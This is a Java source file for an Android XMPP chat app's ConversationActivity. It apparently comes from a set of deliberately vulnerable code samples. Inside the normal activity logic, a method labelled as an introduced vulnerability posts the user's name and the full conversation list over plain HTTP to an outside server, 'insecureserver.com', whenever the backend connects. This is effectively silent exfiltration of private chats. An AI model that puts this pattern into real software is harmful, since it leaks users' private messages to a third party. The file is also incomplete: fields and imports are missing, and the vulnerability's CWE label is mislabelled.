java
package de.gultsch.chat.ui;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;
import java.io.IOException; // Import necessary classes for HTTP communication

import de.gultsch.chat.R;
import de.gultsch.chat.R.id;
import de.gultsch.chat.entities.Contact;
import de.gultsch.chat.entities.Conversation;
import de.gultsch.chat.entities.Message;
import de.gultsch.chat.utils.UIHelper;
import android.net.Uri;
import android.os.Bundle;
import android.app.FragmentTransaction;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Typeface;
import android.support.v4.widget.SlidingPaneLayout;
import android.support.v4.widget.SlidingPaneLayout.PanelSlideListener;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ListView;
import android.os.AsyncTask; // Import AsyncTask for network operations
import android.widget.ArrayAdapter;

public class ConversationActivity extends AppCompatActivity {

    private List<Conversation> conversationList = new ArrayList<>();
    private ArrayAdapter<Conversation> listAdapter;
    private SlidingPaneLayout spl;
    private boolean paneShouldBeOpen = false;
    private boolean handledViewIntent = false;
    private OnConversationListChangedListener onConvChanged;

    // CWE-306: Insecure External API Communication vulnerability introduced here
    private void sendInsecureHttpRequest(String data) {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    URL url = new URL("http://insecureserver.com/api/data"); // Insecure HTTP connection
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    OutputStream os = conn.getOutputStream();
                    os.write(data.getBytes());
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.d("InsecureHTTP", "Response Code: " + responseCode);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return null;
            }
        }.execute();
    }

    @Override
    void onBackendConnected() {

        if (contactInserted) {
            Log.d("xmppService","merge phone contacts with roster");
            contactInserted = false;
            xmppConnectionService.mergePhoneContactsWithRoster();
        }

        xmppConnectionService.setOnConversationListChangedListener(this.onConvChanged);

        if (conversationList.size()==0) {
            conversationList.clear();
            conversationList.addAll(xmppConnectionService
                    .getConversations());

            this.updateConversationList();
        }

        if ((getIntent().getAction().equals(Intent.ACTION_VIEW) && (!handledViewIntent))) {
            if (getIntent().getType().equals(
                    ConversationActivity.VIEW_CONVERSATION)) {
                handledViewIntent = true;

                String convToView = (String) getIntent().getExtras().get(CONVERSATION);

                for(int i = 0; i < conversationList.size(); ++i) {
                    if (conversationList.get(i).getUuid().equals(convToView)) {
                        selectedConversation = conversationList.get(i);
                    }
                }
                paneShouldBeOpen = false;
                swapConversationFragment();
            }
        } else {
            if (xmppConnectionService.getAccounts().size() == 0) {
                startActivity(new Intent(this, ManageAccountActivity.class));
                finish();
            } else if (conversationList.size() <= 0) {
                //add no history
                startActivity(new Intent(this, NewConversationActivity.class));
                finish();
            } else {
                spl.openPane();
                //find currently loaded fragment
                ConversationFragment selectedFragment = (ConversationFragment) getFragmentManager().findFragmentByTag("conversation");
                if (selectedFragment!=null) {
                    Log.d("gultsch","ConversationActivity. found old fragment.");
                    selectedFragment.onBackendConnected();
                } else {
                    Log.d("gultsch","conversationactivity. no old fragment found. creating new one");
                    selectedConversation = conversationList.get(0);
                    Log.d("gultsch","selected conversation is #"+selectedConversation);
                    swapConversationFragment();

                    // Send insecure HTTP request with sensitive data
                    String sensitiveData = "user=" + xmppConnectionService.getUser() + "&data=" + conversationList.toString();
                    sendInsecureHttpRequest(sensitiveData); // Vulnerability introduced here
                }
            }
        }
    }

    // Rest of the code remains unchanged

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.conversations, menu);
        MenuItem menuSecure = (MenuItem) menu.findItem(R.id.action_security);

        if (spl.isOpen()) {
            ((MenuItem) menu.findItem(R.id.action_archive)).setVisible(false);
            ((MenuItem) menu.findItem(R.id.action_details)).setVisible(false);
            menuSecure.setVisible(false);
        } else {
            ((MenuItem) menu.findItem(R.id.action_add)).setVisible(false);
            if (this.getSelectedConversation()!=null) {
                if (this.getSelectedConversation().getMode() == Conversation.MODE_MULTI) {
                    ((MenuItem) menu.findItem(R.id.action_security)).setVisible(false);
                    menuSecure.setVisible(false);
                    ((MenuItem) menu.findItem(R.id.action_archive)).setTitle("Leave conference");
                } else {
                    if (this.getSelectedConversation().getLatestMessage().getEncryption() != Message.ENCRYPTION_NONE) {
                        menuSecure.setIcon(R.drawable.ic_action_secure);
                    }
                }
            }
        }
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
        case android.R.id.home:
            spl.openPane();
            break;
        case R.id.action_settings:
            startActivity(new Intent(this, SettingsActivity.class));
            break;
        case R.id.action_accounts:
            startActivity(new Intent(this, ManageAccountActivity.class));
            break;
        case R.id.action_add:
            startActivity(new Intent(this, NewConversationActivity.class));
            break;
        case R.id.action_archive:
            Conversation conv = getSelectedConversation();
            conv.setStatus(Conversation.STATUS_ARCHIVED);
            paneShouldBeOpen = true;
            spl.openPane();
            xmppConnectionService.archiveConversation(conv);
            selectedConversation = conversationList.get(0);
            break;
        case R.id.action_details:
            DialogContactDetails details = new DialogContactDetails();
            Contact contact = this.getSelectedConversation().getContact();
            if (contact != null) {
                contact.setAccount(this.selectedConversation.getAccount());
                details.setContact(contact);
                details.show(getFragmentManager(), "details");
            } else {
                Log.d("xmppService","contact was null - means not in roster");
            }
            break;
        default:
            break;
        }
        return super.onOptionsItemSelected(item);
    }

    protected ConversationFragment swapConversationFragment() {
        ConversationFragment selectedFragment = new ConversationFragment();

        FragmentTransaction transaction = getFragmentManager()
                .beginTransaction();
        transaction.replace(R.id.selected_conversation, selectedFragment,"conversation");
        transaction.commit();
        return selectedFragment;
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            if (!spl.isOpen()) {
                spl.openPane();
                return false;
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    public void onStart() {
        super.onStart();
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        nm.cancelAll();
        if (conversationList.size()>=1) {
            onConvChanged.onConversationListChanged();
        }
    }

    @Override
    protected void onStop() {
        Log.d("gultsch","called on stop in conversation activity");
        if (xmppConnectionServiceBound) {
            xmppConnectionService.removeOnConversationListChangedListener();
        }
        super.onStop();
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode==INSERT_CONTACT) {
            Log.d("xmppService","contact inserted");
            this.contactInserted  = true;
        }
    }
}